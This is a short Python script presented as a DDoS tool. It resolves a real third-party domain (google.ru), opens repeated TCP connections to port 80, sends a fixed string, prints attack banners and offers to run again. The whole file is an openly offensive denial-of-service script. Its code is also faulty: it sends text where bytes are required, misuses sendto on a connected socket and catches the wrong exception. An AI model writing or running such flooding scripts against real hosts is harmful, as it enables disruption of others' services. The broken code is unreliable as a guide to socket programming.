import time, socket, os, sys, string


def restart_program():
    python = sys.executable
    os.execl(python, python, *sys.argv)
    os.getcwd()


print("DDoS mode loaded")
host = "google.ru"
port = 80
message = "+---------------------------+"
conn = 10
ip = socket.gethostbyname(host)
print("[" + ip + "]")
print("[Ip is locked]")
print("[Attacking " + host + "]")
print("+----------------------------+")


def dos():
    # pid = os.fork()
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, port))
        ddos.send(message)
        ddos.sendto(message, (ip, port))
        ddos.send(message)
    except ValueError:
        print("|[Connection Failed] |")
    print("|[DDoS Attack Engaged] |")
    ddos.close()


for i in range(1, conn):
    dos()
print("+----------------------------+")
print("The connections you requested had finished")
if __name__ == "__main__":
    answer = input("Do you want to ddos more?")
    if answer.strip() in "y Y yes Yes YES".split():
        restart_program()
    else:
        print("bye")
